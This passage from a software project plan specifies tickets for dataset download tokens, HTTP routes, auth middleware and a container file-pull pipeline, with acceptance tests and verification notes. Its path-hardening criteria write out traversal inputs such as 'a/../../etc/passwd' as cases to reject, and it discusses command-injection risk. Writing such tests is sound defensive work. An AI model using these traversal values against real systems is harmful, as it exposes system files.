  - **The scope value contains no version and no dataset id.** The token pins `(project, name)`,
    so one minted while a name is at version 3 verifies unchanged against version 7 of the same
    name; there is a test that says so in those terms.
  - The `sid` claim is empty, with a comment citing the reasoning at
    `go/cmd/agentd/embedtoken.go:159-167` — a non-empty `sid` would make this a working
    core-MCP credential, because `/mcp` authenticates a caller by exactly that claim.
  - The mint helper returns the token **and** its `exp`, read back off the token it just signed
    rather than recomputed — the `embedTokenExpiry` precedent
    (`go/cmd/agentd/embedtoken.go:196`). A body promising an expiry the token does not carry
    is the off-by-one that shows up later as a rare, unreproducible 401.
  - TTL is **clamped, never rejected**, in a table test with these exact rows: `0 → 300s`
    (the default), `5 → 60s`, `59 → 60s`, `300 → 300s`, `900 → 900s`, `100000 → 900s`,
    `-1 → 60s`.
  - `verifyDatasetToken(secret []byte, raw string) (project, name string, err error)` returns the
    pinned pair, and errors — distinctly enough for O5 to answer 404 rather than leak a reason —
    on each of: an expired token; a token signed with a different secret; a token signed with a
    non-HS256 method; a token carrying a non-empty `sid`; a token with no `scope` claim; a token
    whose scope is `session:…`; and a token whose `customer` claim disagrees with its scope's
    project half. Each is its own case.
  - A token minted for `(wolf, a)` yields `("wolf", "a")` and never `("wolf", "b")` — the
    comparison against the requested name is O5's, but the verifier must return the pair that
    makes it possible.
  - **These are unit-level claims about the mint/verify pair.** Route-level behaviour, the
    `?token=` middleware leg, and the "a dataset token presented as `Authorization: Bearer` is
    401" lock are all O5's.
- **TDD:** yes.
- **Validation:**
  - `cd go && go build ./... && go vet ./...`
  - `cd go && go test ./cmd/agentd/... -run 'TestDatasetToken' -count=1 -v | grep -E '^--- (PASS|SKIP|FAIL)'`
    — at least **six `--- PASS`** and **zero `--- SKIP`**. Empty output means the name filter
    matched nothing, which passes silently and is the trap this line exists to catch.
  - `cd go && go test ./extension/devclaims/... -run 'TestDatasetScope' -count=1 -v | grep -E '^--- (PASS|FAIL)'`
    — at least **two `--- PASS`**.
  - `cd go && go test ./cmd/agentd/... ./extension/devclaims/... -count=1` — both packages whole.
    `devclaims` is shared by embed tokens, session tokens and the login issuer, so a change to its
    scope parser has to be shown not to move any of them.
- **Depends on:** — *(this ticket touches no dataset store code; the plan's O1 edge was
  bookkeeping, not a real dependency, so O4 can run beside O2 and O3)*
- [x] done
- Notes: **Delivered on branch `O4-dataset-download-tokens`, commit `17b1b43`, based on `main`
  (O4 genuinely has no dataset-store dependency, so this is the one wave-2/3 branch that can be
  compared against `main`). No fix round.** Orchestrator re-ran the Validation on 2026-08-21:
  build+vet clean, 12 `TestDatasetToken*` PASS under `cmd/agentd`, 6 `TestDatasetScope*` PASS under
  `devclaims`, all files `gofmt`-clean.
  Signatures O6b consumes, none of which the plan pinned:
  `mintDatasetToken(secret []byte, project, name string, ttlSeconds int) (token string, exp int64, err error)`
  and `verifyDatasetToken(secret []byte, raw string) (project, name string, err error)`. TTL is
  clamped to `[60s, 900s]` with a 300s default; `exp` is read back off the *signed* token rather
  than recomputed. The claims carry `Job: "dataset-download"` and an **empty `UserEmail`** — this
  helper has no caller identity to attribute, unlike `embedtoken.go`'s mint path which always
  threads the API-key principal's email. **If O6b needs the caller attributed, it needs a signature
  change, and asking for one is cheaper than inventing a parameter here.** `devclaims` gains
  `DatasetScope`/`ParseDatasetScope` as siblings of the session pair, pinning `(project, name)` with
  **no version and no dataset id**, and a test asserts a dataset scope never parses as a session
  scope in either direction. O4 touches no `httpapi`, no `auth.go` and no store code — those stay
  O5's and O6b's.

### O5: Dataset HTTP read routes   [Status: done | Model: opus]
- **Scope:** The four routes in **Interfaces**, the two `httpapi.Config` seams they need, and —
  by owner decision **B1** — the two matching halves of `apiAuthMiddleware`. Follow
  `go/httpapi/artifacts_download.go` for byte serving and `go/httpapi/memories.go` for metadata
  shape and tenancy posture.
  **This ticket owns `go/cmd/agentd/auth.go`; no other ticket may touch it.** It makes exactly two
  changes there, and both are load-bearing:
  1. **The `?token=` leg.** `apiAuthMiddleware` (`go/cmd/agentd/auth.go:62`) answers 401 to any
     request carrying neither `X-API-Key` nor `Authorization: Bearer`, *before* the handler runs —
     so the agent's `curl http://172.17.0.1:8099/agent/datasets/<n>/download?token=<t>`, the exact
     call O6b's tool description and O9 require, never reaches O5's code. One narrow leg goes in
     **after** the `X-API-Key` branch (`:65-78`) and **before** the `devOpen` branch (`:79`).
  2. **The bearer lock.** Dataset tokens are signed with the same secret and carry the same empty
     `sid` as an embed token, and the middleware today parses `claims["scope"]` only through
     `ParseSessionScope`, which returns `ok=false` for a `dataset:` value and leaves the principal
     **unrestricted** — see `TestAuthMiddleware_UnknownScopeKindIsNotASessionScope`
     (`go/cmd/agentd/auth_test.go:225`), which asserts 200 today. As it stands, a dataset token
     presented as `Authorization: Bearer` authenticates as a full project principal on every
     `/agent/*` route. That is a live security defect in the design, adjacent to hazard H1, and
     closing it is part of this ticket.
  **`go/httpapi` must not import `extension`** (`go/httpapi/memories.go:87` states the rule), and
  `agentdb` cannot reach a blob store at all, so the bytes arrive through a new single-method
  interface declared in `go/httpapi/datasets.go` and wired in `main.go` from the process-wide
  `blobs` value built at `go/cmd/agentd/main.go:114`.
  Test names are pinned: everything O5 adds under `go/httpapi` is `TestDataset…`, everything it
  adds under `go/cmd/agentd` is `TestDatasetDownloadAuth…`. **O5 adds no live-Postgres test** —
  its route coverage runs on fakes — so a `--- SKIP` in either filtered run is a defect.
- **Repo:** agent-orange
- **Files:** create `go/httpapi/datasets.go`, `go/httpapi/datasets_test.go`; modify
  `go/httpapi/httpapi.go` (the `Endpoints` field list, `DefaultEndpoints`, the guarded
  registration map in `Mux()`, `Config` gaining two fields, the `New()` auto-fill block, and
  `Identity` gaining `DatasetScope`); modify `go/cmd/agentd/auth.go`,
  `go/cmd/agentd/auth_test.go`, `go/cmd/agentd/main.go`.
- **Acceptance criteria:**
  - **Routes.** `Endpoints` gains four fields and `DefaultEndpoints` the four patterns exactly as
    Interfaces writes them; registration goes in the existing guarded map in `Mux()`, so a host
    that blanks a pattern unmounts it rather than panicking.
  - **Two `Config` seams, with different defaulting rules, and the difference is the point.**
    `Datasets DatasetStore` (metadata; declared in `go/httpapi/datasets.go` with
    `var _ DatasetStore = (*agentdb.Store)(nil)`, auto-filled from `cfg.AgentDB` in `New()`
    alongside `Memories`, nil ⇒ **501**). `DatasetBlobs DatasetBlobReader` — a NEW interface
    `Read(ctx context.Context, key string) (io.ReadCloser, error)`, **not** auto-filled, wired in
    `main.go`; nil ⇒ **501 on the download route only**, while the three metadata routes keep
    working.
  - **The metadata body is a dedicated `datasetResp`, not `agentdb.Dataset`** — that struct
    carries json tags for `blob_path` and `project`, and the first is an internal storage key
    while the second is already the caller's own credential. Fields, in this order:
    `id, name, version, labels, size_bytes, row_count, sha256, content_type, created_by_worker,
    created_by_session, created_at`, with `created_at` in unix **milliseconds**. The reasoning is
    `memoryRecordResp`'s, and a test asserts `blob_path` and `project` appear nowhere in any of
    the three metadata responses.
  - **Envelopes, byte-for-byte:** the list route returns `{"datasets":[…]}`; the single-name route
    returns the **bare object**; the versions route returns `{"versions":[…]}`, newest first. The
    ten fields shared with O6b's `dataset_list` output are byte-identical in name.
  - Project scope comes from the credential only. There is no project parameter on any of the
    four routes.
  - `selector` and `limit` pass through to the store unchanged; the store clamps the limit (O3).
    A selector the parser rejects is **400 carrying the parser's own message**, and
    `ErrDatasetRequiresPostgres` is **501** — the same two-way mapping `ListMemories` already
    does (`go/httpapi/memories.go:160-169`).
  - **404 parity.** Unknown name, malformed name, a name belonging to another project, a
    `?version=` that is non-numeric or `< 1`, and a version that does not exist all return `404`
    with a **byte-identical body**. The route is not an existence oracle, and a name is
    caller-chosen and guessable in a way a uuid is not.
  - Byte responses set `Content-Type` from the row, `X-Content-Type-Options: nosniff`, and
    `Content-Disposition: attachment` with the dataset name as the filename. **No
    `Content-Length`** — `size_bytes` is metadata written by a different call than the bytes, and
    a stale value truncates the response.
  - A row whose `blob_path` the reader cannot open is **410** (the bytes existed and no longer
    do); a nil `Datasets` is **501**; a nil `DatasetBlobs` is **501** on the download route only;
    a credential naming no project is **403** — no dataset is being hidden, the question cannot be
    asked (`memoryReadable`'s reasoning, `go/httpapi/memories.go:96-109`).
  - **`?version=` absent means the current version**; present and valid means that version.
  - **The `?token=` leg, and it is graded against the real middleware, not the bare handler.**
    A request with `?token=<valid>` and no auth header reaches the download handler and gets
    bytes. The leg fires only when the method is `GET` **and** the path is
    `/agent/datasets/<exactly one segment>/download`; on a verification failure it falls through
    to the existing 401. On success it installs a principal whose `customer` is the token's pinned
    project and whose new `datasetScope` field is `<project>/<name>`, surfaced to `httpapi` as
    `Identity.DatasetScope`. The test drives `apiAuthMiddleware` end to end, following the O7
    precedent in `go/cmd/agentd/sessionsecret_test.go` and the `captureIdentity` helper in
    `go/cmd/agentd/auth_test.go`.
  - **A token for dataset `a` used on `b`'s download URL is `404`, not `403`** — same non-oracle
    rule. The handler compares `Identity.DatasetScope` to `<Customer>/<name>` and answers with the
    identical 404 body.
  - **A dataset token supplied as `Authorization: Bearer` is `401` on every route, the download
    route included.** The check sits next to the existing `sid` lock (`go/cmd/agentd/auth.go:116`)
    and has the same reasoning: a credential that reaches a container is not API-class. The test
    mints a real dataset token and drives it through the middleware at `GET /agent/memories`
    **and** at `GET /agent/datasets/x/download`.
  - **`?token=` is not a credential anywhere else.** The three metadata routes read no query
    credential, so a request carrying only `?token=<valid>` to `GET /agent/datasets`,
    `GET /agent/datasets/{name}` or `GET /agent/datasets/{name}/versions` is `401` at the
    middleware. Tested against the real middleware.
  - **Nothing else changes.** No route outside the dataset download path sees any behaviour
    difference, and `TestAuthMiddleware_UnknownScopeKindIsNotASessionScope` — a token scoped
    `project:wolf` — must still pass unmodified: the lock is specific to `dataset:`, not to
    "any scope I do not recognise".
- **TDD:** yes.
- **Validation:**
  - `cd go && go build ./... && go vet ./...`
  - `cd go && go test ./httpapi/... -run 'TestDataset' -count=1 -v | grep -E '^--- (PASS|SKIP|FAIL)'`
    — at least **eight `--- PASS`** and **zero `--- SKIP`**; empty output means the filter matched
    nothing. O5 writes no live-Postgres test, so a SKIP here is a defect, not an environment gap.
  - `cd go && go test ./cmd/agentd/... -run 'TestDatasetDownloadAuth' -count=1 -v | grep -E '^--- (PASS|SKIP|FAIL)'`
    — at least **four `--- PASS`** and **zero `--- SKIP`**.
  - `cd go && go test ./httpapi/... ./cmd/agentd/... -count=1` — both packages whole. This is the
    command that proves the middleware edit moved nothing else, and it is not optional.
- **Depends on:** O3, O4
- [x] done — verified 2026-08-21, 16/16 criteria, zero defects, zero fix rounds
- Notes: **Implemented and independently verified 2026-08-21 — 16 of 16 criteria PASS, zero
  defects, zero fix rounds.** Branch `O5-dataset-http-routes`, commit `bd40b86`, merged to `main`.
  Four routes in `go/httpapi/datasets.go`; `Config` gains two seams with **deliberately different
  defaulting rules** — `Datasets` auto-fills from `cfg.AgentDB` in `New()` beside `Memories`
  (nil ⇒ 501 on all four), while `DatasetBlobs` is a new single-method `DatasetBlobReader`
  (`Read(ctx, key) (io.ReadCloser, error)`, because httpapi must not import `extension`) wired by
  hand in `main.go` (nil ⇒ 501 on download alone, metadata unaffected). Metadata serialises through
  a dedicated `datasetResp` so `blob_path` and `project` never leave the process, pinned by a
  literal whole-body assertion. 404 is one byte-identical sentence for absent, malformed,
  foreign-project and every unusable `?version=`, gated by a test driving 11 request shapes across
  all four routes that fails if any body differs. 24 new tests. The `?token=` leg is graded
  **through the real `apiAuthMiddleware` in front of the real mux**: a header-less request returns
  the bytes, a cross-name and a cross-project token both return the 404. Contract for later
  tickets: envelopes are `{"datasets":[…]}`, the bare object, and `{"versions":[…]}` newest first;
  `Identity.DatasetScope` is `<project>/<name>` and is enforced on the download route **only**.
  **Two hazards for O10 to document** — the `?token=` leg matches a HARDCODED literal path in
  `cmd/agentd`, because middleware runs before the mux and cannot see `httpapi.Endpoints`, so a
  host that remaps `Endpoints.DownloadDataset` keeps the route and silently loses the token leg
  (the failure looks like a 401 from inside a container); and httpapi does not defend against a
  host whose `IdentityFunc` sets `DatasetScope` on a *metadata* request, which would hand
  project-wide metadata to a dataset-scoped credential. Neither is reachable through `agentd`.
  23 guesses — the wave's highest — in `design/2026-08-21-agent-wolf-wave4-guesses.md`.
  Found **R86**.
### O6a: The workspace pull pipeline   [Status: done | Model: sonnet]
- **Scope:** One internal, testable function that gets a file out of a running session container
  safely: validate the path, probe, cap, pull, hash, count, store the blob. No MCP surface, no CAS
  — O6b orchestrates it. Split from a single O6 because the pull is where every sharp edge lives
  (**R33**). **Every test function in this ticket is named `TestPullWorkspaceFile…`**, so the
  Validation filter and the code agree; `-run` is an unanchored substring and a test named anything
  else is silently not run.
- **Repo:** agent-orange
- **Files:** create `go/cmd/agentd/datasetpull.go`, `go/cmd/agentd/datasetpull_test.go`.
- **The seams, named — every line number below re-verified 2026-08-21. Do not go looking:**
  - The pattern to copy is `onArtifactRegistered` (`go/runner.go:2733-2839`). It resolves the
    instance with `r.get(q.SessionID)` (`:2746`, defined `:2980`) **and** the environment with
    `r.workerEnvFor(q.SessionID)` (`:2751`, defined `:2611`). Both are unexported methods on
    `runnerImpl` — which is why O6b adds an exported `Runner.ExecInSession` and this function never
    touches the Runner at all (audit **A9**).
  - Execs go through `ExecutionEnvironment.Exec(ctx, id, cmd []string, opts)`
    (`go/execenv/execenv.go:54`), returning `*ExecResult{ExitCode, Stdout, Stderr}` (`:143-147`).
    `cmd` is **argv**. There is no shell.
  - **Copy the pattern, not its error handling.** That path is best-effort artifact capture: it
    checks only `err != nil` and **ignores `res.ExitCode`** (`go/runner.go:2824-2828`).
  - Blob storage is `BlobStore.Write` / `Delete` (`go/extension/extension.go:92-98`). The interface
    is `Write/Read/Exists/Delete/List` — **there is no `Put`**; an earlier draft cited one.
- **Interface it must produce.** The exec seam is injected rather than taken as
  `(env, InstanceID)`, so the whole function is unit-testable with no Docker and O6b binds it to
  the Runner (audit **A9**):
  ```go
  type sessionExec func(ctx context.Context, cmd []string,
      opts execenv.ExecOptions) (*execenv.ExecResult, error)

  type pulledFile struct {
      BlobPath  string // under agentdb.DatasetBlobPrefix
      SizeBytes int64
      RowCount  int
      SHA256    string
  }

  func pullWorkspaceFile(ctx context.Context, exec sessionExec, relPath, contentType string,
      maxBytes int64, blobs extension.BlobStore) (*pulledFile, error)
  ```
- **Acceptance criteria:**
  - **Path hardening — the check is graded on this enumerated list, not on the word "escapes."**
    An escape route not named here is a plan bug to be logged, not an executor failure (the
    **R38** rule). `relPath` is resolved as `path.Clean("/workspace/" + relPath)` and **rejected
    unless** the result has the prefix `/workspace/` **by path segment** — `/workspace-evil/x` must
    fail — and is not `/workspace` itself. Rejected, each with its own test case: the empty string;
    `.`; `..`; `a/../../etc/passwd`; `../workspace-evil/x`; any `relPath` beginning `/` (absolute
    paths are rejected outright — the tool contract is "relative to `/workspace`", so
    `/workspace/prices.csv` is a rejection, not a synonym); a NUL byte or a newline anywhere in the
    string; a segment equal to `.git`. All of it happens **before any exec runs**.
  - **Symlinks are explicitly NOT checked.** They cannot be decided from a string, and the exec-side
    `test -f` is the only defence there is. Say so in a comment so the next reader does not read the
    absence as an oversight.
  - **Every exec is argv, never `sh -c`:** `[]string{"test","-f",abs}`, `[]string{"wc","-c",abs}`,
    `[]string{"cat",abs}`. A test asserts **no command's `cmd[0]` is `sh` or `bash`**.
    ⚠️ An earlier wording said "no command element is `sh`, `bash` or `-c`", which is
    **unsatisfiable alongside this ticket's own mandated `wc -c` argv** — read literally it fails
    against the very command shape the ticket pins. O6a implemented the evidently-intended check and
    reported the contradiction rather than silently dropping half of it; corrected here 2026-08-21
    (**R87**). Do **not**
    copy `WriteWorkspaceFile`'s `sh -c` form (`go/runner.go:924-928`): with an attacker-supplied
    path that is command injection from inside a container (audit **A8**).
  - **Probes with `test -f` and requires `ExitCode == 0` from every command it runs.**
    `cat /workspace/missing.csv` returns `err == nil`, `ExitCode == 1` and empty stdout — copying
    the artifact path verbatim would silently store a 0-row dataset. Tests: a missing path, a
    directory path, and a `cat` that exits non-zero after a successful probe.
  - **Probes size with `wc -c` and refuses anything over `maxBytes` before reading content.**
    `execAndCollect` buffers all exec output into memory with no limit
    (`go/execenv/docker/client.go:238-240`), and agentd shares DinD's network namespace and serves
    every session, so an unbounded pull is a memory DoS from inside a container. `wc -c <file>`
    prints `<n> <path>`: take the first whitespace-separated field; a non-integer first field is an
    error, never a zero. The refusal names both the observed size and the cap. The cap is
    re-checked against the bytes actually pulled, because the file can grow between the two execs.
  - Bytes are preserved exactly, including NUL bytes and non-ASCII — `stdcopy.StdCopy` is
    binary-safe, so nothing here may re-encode, trim or line-split the payload before hashing.
  - **`RowCount` for `text/csv` is `max(0, N-1)`**, where `N` counts a `\n`-terminated run plus a
    final unterminated run when the last byte is not `\n`. So `"h\na\nb"` and `"h\na\nb\n"` both
    give 2, `"h\n"` gives 0, and empty bytes give 0 — **never negative**: O1 declared the column
    `NOT NULL DEFAULT 0` and O6b's 50% shrink guard divides by it. Counted in Go over the exact
    stored bytes, never with a second `wc -l` exec. `RowCount` is 0 for every other content type,
    and the `text/csv` match ignores parameters (`text/csv; charset=utf-8` counts). Tests cover:
    trailing newline, no trailing newline, header only, empty file, CRLF endings (the `\r` stays in
    the bytes and the line still counts), and `text/plain`.
  - **The blob key is `agentdb.DatasetBlobPrefix + <fresh uuid4>`, per write attempt.** Reference
    the constant declared by O3 in `go/agentdb/datasets.go` (§ "The blob namespace"); do **not**
    re-declare it and do **not** derive the key from the dataset name or a version number — two
    concurrent pulls of the same dataset must not collide, and O3's reaper and O8's sweep enumerate
    on exactly that prefix over a **global** `BlobStore` shared with `_artifacts/bytes/` and
    snapshots (`newBlobs` → `Global("")`, `go/cmd/agentd/backends.go:59-76`). A test asserts two
    calls with identical arguments produce different keys and that both carry the prefix.
  - `SHA256` is computed over the exact bytes stored; a fixture asserts a hand-computed digest.
  - On any failure **after** `blobs.Write` succeeds, the blob is best-effort deleted and the
    original error is returned; a delete failure is logged, never fatal. A test with a blob store
    whose `Delete` always fails asserts the original error still surfaces unchanged.
- **TDD:** yes.
- **Validation:**
  - `cd go && go test ./cmd/agentd/... -run 'TestPullWorkspaceFile' -count=1 -v` — the `-v` is
    required, because a `-run` pattern that matches nothing exits **0**. The output must carry a
    `--- PASS` line for each of: path rejection, argv-not-shell, exit-code handling, the size cap,
    byte fidelity, row counting, blob-key uniqueness and delete-on-failure. Zero `--- SKIP`.
  - `cd go && go build ./... && go vet ./...`
- **Depends on:** O3 *(`agentdb.DatasetBlobPrefix` and nothing else; O6a needs no HTTP route, so it
  may run in parallel with O4 and O5 rather than behind them as revision 3 had it)*
- [x] done — verified 2026-08-21, 13/13 criteria, zero fix rounds
- Notes: **Implemented and independently verified 2026-08-21 — 13 of 13 criteria PASS, zero
  blocking defects, zero fix rounds.** Branch `O6a-workspace-pull-pipeline`, commit `640c944`,
  merged to `main`. Two files, nothing else touched. Every pinned line number in the ticket was
  re-checked against the post-merge tree and still holds. The injected `sessionExec` seam works as
  intended: the verifier re-ran the suite with `DOCKER_HOST` pointed at a non-existent socket and
  it passed, proving the pipeline genuinely needs no Docker. It does **not** repeat
  `onArtifactRegistered`'s mistake — `res.ExitCode` is checked, not ignored. **Three minor defects
  were accepted rather than fixed**, all recorded by the verifier: (1) the TOCTOU cap re-check runs
  *after* `blobs.Write`, so an oversized payload is uploaded in full and then deleted — which is
  what makes the delete-on-failure path testable, and the ticket only requires the cap be
  "re-checked against the bytes actually pulled"; (2) the SHA256 test recomputes the digest with
  the same library rather than pinning a literal, though the verifier hand-computed one
  independently and it matched; (3) `TestPullWorkspaceFile_ArgvNotShell` is near-redundant because
  the fake already rejects any unknown `cmd[0]`, so the verifier wrote a real exact-argv assertion
  itself to prove the criterion. 8 guesses. Found **R87**.
### O6b: Dataset MCP tools   [Status: done | Model: opus]
- **Scope:** `dataset_list`, `dataset_get`, `dataset_put` on the existing `core` MCP server, built
  on O6a's pull function plus O2's CAS store — **and the one engine change O6a's seam requires**: an
  exported `Runner.ExecInSession`, because nothing exported today can turn a session id into a
  runnable exec (audit **A9**). Test-name prefixes are pinned so the Validation filters match:
  `TestDatasetTools…` in `cmd/agentd`, `TestExecInSession…` in the root `agentkit` package.
- **Repo:** agent-orange
- **Files:** create `go/cmd/agentd/mcp_datasets.go`, `go/cmd/agentd/mcp_datasets_test.go`,
  `go/runner_execinsession_test.go`; modify `go/cmd/agentd/main.go` (one `mcpSrv.register(...)` line
  beside `:572-577`, plus parsing `AGENTKIT_DATASET_MAX_BYTES` at boot), `go/agentkit.go` (the
  `Runner` interface), `go/runner.go` (the implementation), **`go/httpapi/fakes_test.go` and
  `go/cmd/agentd/router_test.go`** — each holds a `stubRunner` assigned to an `agentkit.Runner`
  field (`httpapi/fakes_test.go:81`, `cmd/agentd/router_test.go:1349`), so adding a method to the
  interface breaks both packages' tests until each stub gains it. Those two are the difference
  between a green ticket and a red `go vet ./...` at the end of it.
- **The seams, named:**
  - **`Runner` gains exactly one exported method**, declared beside `WriteWorkspaceFile`
    (`go/agentkit.go:281-284`; `execenv` is already imported at `:19`, so no new import):
    ```go
    ExecInSession(ctx context.Context, ref SessionRef, cmd []string,
        opts execenv.ExecOptions) (*execenv.ExecResult, error)
    ```
    Implemented in `go/runner.go` exactly like `WriteWorkspaceFile` (`:911-931`): resolve with
    `r.get(ref.SessionID)` and `r.workerEnvFor(ref.SessionID)`, and error
    `exec-in-session: session %q has no running instance` when either is absent. It returns the raw
    `ExecResult` and **does not interpret `ExitCode`** — that is O6a's job.
  - The tools take a **narrow interface declared in `mcp_datasets.go`** that `agentkit.Runner`
    satisfies, exactly as `sessionSnapshotter` (`mcp_images.go:62-64`) and `sessionLocator`
    (`mcp_skills.go:70-72`) do. Do not hand the tools the whole Runner.
  - The MCP layer authenticates by session token before any handler runs;
    `mcpCaller{Project, SessionID, Worker, Identified}` (`mcpserver.go:99-111`) is both the hard
    scope and the provenance.
  - `AGENTKIT_SELF_URL` is read once at boot (`main.go:214`) and passed in. Never read the
    environment from inside a tool handler.
- **Acceptance criteria:**
  - No tool returns file bytes. `dataset_get` returns a URL; `dataset_put` returns metadata.
  - **Field names are byte-identical to § "Dataset metadata JSON" for the ten shared fields.**
    `dataset_list` → `{"datasets":[{name, version, size_bytes, row_count, sha256, content_type,
    labels, created_at, created_by_worker, created_by_session}]}`, `created_at` in unix
    **milliseconds**. `blob_path` and `project` are never serialised. `limit` defaults to 20, max
    100, and the cap is stated in the result rather than truncating silently.
  - `dataset_get` → `{name, version, size_bytes, row_count, sha256, content_type, labels,
    download_url, expires_at}`. **`expires_at` is unix SECONDS**, matching its sibling
    `embedTokenResponse.ExpiresAt` (`go/cmd/agentd/embedtoken.go:63-67`) and deliberately unlike
    `created_at`'s milliseconds — encode the unit in the comment, per the house rule.
  - **`download_url` is built on `AGENTKIT_SELF_URL`**, never on `AGENTKIT_PUBLIC_BASE_URL`, as
    `<selfURL>/agent/datasets/<url.PathEscape(name)>/download?version=<v>&token=<t>`. A test asserts
    the prefix. The two values are deliberately different (`go/cmd/agentd/permalink.go` documents
    the split) and the public base is unreachable from a nested container — this is the most likely
    wrong turn in the ticket, and O9 is what would catch it three tickets later.
  - The token is minted by O4's helper and carries scope `dataset:<project>/<name>` — a name, never
    a version id — so a URL minted before a tick still resolves after it.
  - `dataset_get`'s tool description instructs the model to curl the URL to a file, not to echo the
    URL, and not to print the file's contents, and states that the URL carries a bearer credential
    which therefore enters the transcript (§ "The dataset atom" caveat box, **R18**).
  - `dataset_put` passes `AGENTKIT_DATASET_MAX_BYTES` (default **64MiB**) to O6a as `maxBytes`,
    parsed once at boot in `main.go`; an unparseable value is a boot error naming the variable.
    O8 is what makes the variable reach agentd through compose.
  - **CAS.** `if_version` must equal the current version; `0` means "must not exist". A conflict is
    returned as an error naming the current version so the model can re-read and retry. On conflict
    the blob O6a just wrote is best-effort deleted; a delete failure is logged, never fatal, and
    O3's orphan sweep is the backstop. A test asserts the delete was attempted.
  - **The shrink guard** refuses a replacement whose `row_count` is below 50% of the current
    version's unless `allow_shrink: true`, and the refusal names both counts. It applies only when
    a current version exists **and** its `row_count > 0`; a current version of 0 rows has nothing to
    shrink from and the write is allowed. Tested in all three shapes.
  - Every mutation reads the row back and echoes it (house rule, `docs/18` § 6).
  - **Provenance comes from the authenticated caller, never from an argument:**
    `created_by_session = caller.SessionID`, `created_by_worker = caller.Worker`. A caller whose
    session row could not be read (`caller.Identified == false`) **refuses the write** rather than
    guessing — the RD4 invariant, `mcpserver.go:105-111`. There is a test for the refusal.
  - **This criterion is what makes Wolf's trust model hold:** a dataset or a memory written from
    inside a container can never carry empty provenance, so "empty provenance ⇒ server-written"
    stays true. Do not add an argument that lets a caller name itself.
  - Datasets write **no config event** — they are data. Note in a comment that
    `TestMutationsAreLogged` classifies by noun through `looksLikeConfigMutation` over
    `configEntityNouns` (`go/agentdb/config_events_test.go:562-592`), and `Dataset` is not among
    those nouns, so the sweep does not cover dataset store methods. Verified 2026-08-21, not
    assumed — and the Validation re-runs that test so a later change to the noun list surfaces here.
  - Registration is one line inside the existing `if agentDB != nil` block beside `main.go:572-577`,
    so the dataset tools are absent off Postgres exactly like the rest of the core server, and the
    boot log's `tools=` list names all three.
- **TDD:** yes.
- **Validation:**
  - `cd go && go test ./cmd/agentd/... -run 'TestDatasetTools' -count=1 -v` — `-v` is required
    because a `-run` matching nothing exits 0. The output must carry a `--- PASS` line for each of:
    `dataset_list` shape, the `download_url` prefix, the token scope, the CAS conflict and its blob
    delete, the shrink guard (all three shapes), and the unidentified-caller refusal.
  - `cd go && go test . -run 'TestExecInSession' -count=1 -v` *(the root package is `agentkit`;
    `./...` would work too but is slow, and `-v` proves the new cases actually ran)*
  - `cd go && go test ./agentdb/... -run 'TestMutationsAreLogged' -count=1`
    *(that test lives in `go/agentdb/config_events_test.go:594`, NOT in `cmd/agentd` — running it
    against the wrong package matches nothing and passes vacuously, **R12**)*
  - `cd go && go build ./... && go vet ./...` — `go vet` typechecks `_test.go` files, so a
    `stubRunner` that has not gained `ExecInSession` fails **here**, which is the cheapest place to
    find it.
- **Depends on:** O6a, O5 *(O5 brings O4 transitively: `dataset_get` mints with O4's helper and
  points at O5's download route)*
- [x] done — verified 2026-08-21, 17/17 criteria, zero defects, zero fix rounds
- Notes: **Implemented and independently verified 2026-08-21 — 17 of 17 criteria PASS, zero
  defects, zero fix rounds.** Branch `O6b-dataset-mcp-tools`, commit `e31d4d4`, merged to `main`.
  Three tools in one new file plus one `mcpSrv.register(...)` line inside main.go's
  `if agentDB != nil` block, so they are absent off Postgres exactly like the rest of the core
  surface. **No tool carries bytes.** `dataset_get` returns a short-lived URL built on
  `AGENTKIT_SELF_URL` — never the public base — minted by O4's helper and scoped to
  `(project, name)` with **no version**, so a v3 and a v7 URL round-trip to the same pair; its
  description tells the model to `curl -o` and never to echo the URL, which carries a bearer
  credential into the transcript and the event stream. `dataset_put` names a `/workspace` file
  agentd pulls out of the calling container with O6a's pipeline. Writes go through CAS with the
  blob written first, so a conflict deletes it best-effort and names the real current version; a
  delete failure is logged, never fatal, and a test proves the conflict error survives a blob store
  whose `Delete` always errors. Provenance comes from `mcpCaller` alone — there is no argument for
  it and an unidentified caller is refused rather than written with empty provenance, which is what
  keeps O7's trust anchor meaningful. **The interface break was the real risk and it was handled:**
  `agentkit.Runner` gained `ExecInSession`, and both out-of-package `stubRunner`s
  (`httpapi/fakes_test.go`, `cmd/agentd/router_test.go`) gained the method — the verifier re-ran
  the whole-module `go vet ./...` and `go test ./...` itself to confirm, since a package-scoped
  green run proves nothing there. **O5's ten-field contract was checked, not assumed**: the test
  holds O5's literal pinned HTTP body and compares names and values field for field. They agree.
  Field **order** differs between the two surfaces (O5 leads with `id`, the tool follows the plan's
  printed order) — not a defect, since the criterion is about names, but a consumer comparing
  serialised bytes would see two strings for one row. 25 guesses. Also flagged: `dataset_list`'s
  argument is `selector` while `memory_search` and `skill_list` use `label_selector` for the
  identical grammar — pinned by the plan, implemented as written, loud rather than silent when a
  model trips on it because `decodeArgs` rejects unknown fields.
### O7: `POST /agent/memories` — the trust anchor   [Status: done | Model: opus]
- **Scope:** The authenticated memory append route specified in **Interfaces**. This is what makes
  an embedding application able to hold state at all, and its server-stamped empty provenance is
  what makes Wolf's "human decides" invariant enforceable rather than aspirational.
- **Repo:** agent-orange
- **Files:** modify `go/httpapi/memories.go`, `go/httpapi/memories_test.go`,
  `go/httpapi/httpapi.go` (the `MemoryStore` interface gains `CreateMemory`; the doc comment at
  `:84` saying the surface is read-only must be updated, not left lying).
- **Acceptance criteria:**
  - Provenance is stamped empty by the server. A body carrying `created_by_worker` or
    `created_by_session` is **`400`**, not silently ignored.
  - Accepts project API key or console JWT.
  - **A session token never reaches this handler at all.** Session tokens are signed with a
    separate secret (`go/cmd/agentd/sessionsecret.go`), and the middleware independently rejects
    any token carrying a non-empty `sid` claim with **401** (`go/cmd/agentd/auth.go:104-118`,
    "doc 22, RD30"). The test asserts **401 at the middleware**, not 403 at the handler — a
    session token that both authenticates and is then forbidden cannot be constructed.
  - **An embed token DOES reach this handler and must be rejected `403`.** Embed tokens are
    API-class: API secret, empty `sid`, confined only by a `scope` claim that
    `ownsSession` checks on session-by-id routes and nowhere else (hazard H1). The discriminator
    is **`Identity.SessionScope != ""`**; there is a test.
  - *(Note for O10: `docs/19-embedding.md`'s hazard H12 — "the session-token secret and the API
    secret are the same value" — no longer describes this code. Correct it.)*
  - Project comes from the credential; no project field exists in the body.
  - Labels go through the existing validator; a bad label is `400` carrying the validator's own
    message.
  - `embed` defaults true; >24KB with `embed: true` is `400` naming the `embed: false` remedy;
